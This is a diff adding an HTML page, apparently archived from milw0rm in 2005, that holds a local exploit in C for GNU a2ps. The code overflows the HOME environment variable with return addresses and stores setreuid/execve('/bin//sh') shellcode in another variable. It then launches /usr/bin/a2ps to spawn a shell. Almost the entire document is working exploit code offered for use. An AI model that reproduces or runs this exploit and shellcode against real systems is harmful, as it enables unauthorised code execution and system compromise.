@@ -1,0 +1,64 @@
+<html>
+<head>
+<title>GNU a2ps "Anything to PostScript" Local Exploit (not suid)</title>
+<pre>
+/* Not added to Local Non Poc section /str0ke */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;errno.h&gt;
+// by lizard / lizstyle[at]gmail.com
+// greets go to slider/trog for helpin me
+// not suid by default ;(
+#define VULNTHING &quot;/usr/bin/a2ps&quot;
+#define DEFRET 0xbffffffa - strlen(sc) - strlen(VULNTHING)
+#define xnullbitch 1100
+//i`m not a asm guru so i ripped this shellcode
+//shellcode by  man shadow
+char sc[] =
+&quot;\x31\xC9&quot;              /* xor ecx,ecx     */
+&quot;\x31\xDB&quot;              /* xor ebx,ebx     */
+&quot;\x6A\x46&quot;              /* push byte 70    */
+&quot;\x58&quot;                  /* pop eax         */
+&quot;\xCD\x80&quot;              /* int 80h         */
+&quot;\x51&quot;                  /* push ecx        */
+&quot;\x68\x2F\x2F\x73\x68&quot;  /* push 0x68732F2F */
+&quot;\x68\x2F\x62\x69\x6E&quot;  /* push 0x6E69622F */
+&quot;\x89\xE3&quot;              /* mov ebx,esp     */
+&quot;\x51&quot;                  /* push ecx        */
+&quot;\x53&quot;                  /* push ebx        */
+&quot;\x89\xE1&quot;              /* mov ecx,esp     */
+&quot;\x99&quot;                  /* cdq             */
+&quot;\xB0\x0B&quot;              /* mov al,11       */
+&quot;\xCD\x80&quot;;             /* int 80h         */
+
+int main(void) {
+
+int ctr = 0;
+char buffer[xnullbitch];
+fprintf(stdout, &quot;[*] 0x%8x\n&quot;, (long) DEFRET);
+
+for(ctr = 0; ctr &lt; xnullbitch - 1; ctr += 4)
+*(long *) &amp;buffer[ctr] = (long) DEFRET;
+
+buffer[xnullbitch - 1] = '\0';
+
+if((setenv(&quot;HOME&quot;, buffer, 1)) == -1) {
+perror(&quot;setenv()&quot;);
+exit(1);
+}
+
+if((setenv(&quot;TOPX&quot;, sc, 1)) == -1) {
+perror(&quot;setenv()&quot;);
+exit(1);
+}
+
+if((execl(VULNTHING, VULNTHING, NULL)) == -1) {
+perror(&quot;execl()&quot;);
+exit(1);
+}
+return(0);
+}</pre>
+// milw0rm.com [2005-02-13]
+</html>
+
